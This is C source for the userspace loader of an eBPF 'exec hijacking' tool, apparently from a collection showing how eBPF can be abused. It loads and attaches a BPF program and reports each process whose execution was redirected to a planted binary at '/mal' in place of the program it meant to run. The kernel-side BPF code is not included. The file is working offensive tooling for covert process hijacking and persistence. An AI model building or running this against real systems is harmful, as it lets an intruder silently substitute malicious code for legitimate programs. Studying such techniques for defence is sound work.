// SPDX-License-Identifier: BSD-3-Clause
#include <argp.h>
#include <unistd.h>
#include "exechijacking.skel.h"

// Setup Argument stuff
static struct env {
    int pid_to_hide;
    int target_ppid;
} env;

struct event {
    int pid;
    char comm[16];
    bool success;
};

static volatile __sig_atomic_t exiting;

static int handle_event(void *ctx, void *data, size_t data_sz)
{
    const struct event *e = data;
    if (e->success)
        printf("Hijacked PID %d to run '/mal' instead of '%s'\n", e->pid, e->comm);
    else
        printf("Failed to hijack PID %d to run '/a' instead of '%s'\n", e->pid, e->comm);
    return 0;
}

int main(int argc, char **argv)
{
    struct ring_buffer *rb = NULL;
    struct exechijacking *skel;
    int err;

    const char* hijackee_filename = "/mal";
    if(access(hijackee_filename, F_OK ) != 0 ) {
        printf("Error, make sure there is an executable file located at '%s' \n", hijackee_filename);
        exit(1);
    }

    skel = exechijacking__open();
    if (!skel) {
        fprintf(stderr, "Failed to open BPF program: %s\n", strerror(errno));
        return 1;
    }

    err = exechijacking__load(skel);
	if (err) {
		fprintf(stderr, "Failed to load and verify BPF skeleton\n");
		goto cleanup;
	}

    err = exechijacking__attach( skel);
    if (err) {
        fprintf(stderr, "Failed to attach BPF program: %s\n", strerror(errno));
        goto cleanup;
    }

    rb = ring_buffer__new(bpf_map__fd(skel->maps.rb), handle_event, NULL, NULL);
    if (!rb) {
        err = -1;
        fprintf(stderr, "Failed to create ring buffer\n");
        goto cleanup;
    }

    printf("Successfully started!\n");
    while (!exiting) {
        err = ring_buffer__poll(rb, 100 /* timeout, ms */);
        /* Ctrl-C will cause -EINTR */
        if (err == -EINTR) {
            err = 0;
            break;
        }
        if (err < 0) {
            printf("Error polling perf buffer: %d\n", err);
            break;
        }
    }

cleanup:
    exechijacking__destroy( skel);
    return -err;
}
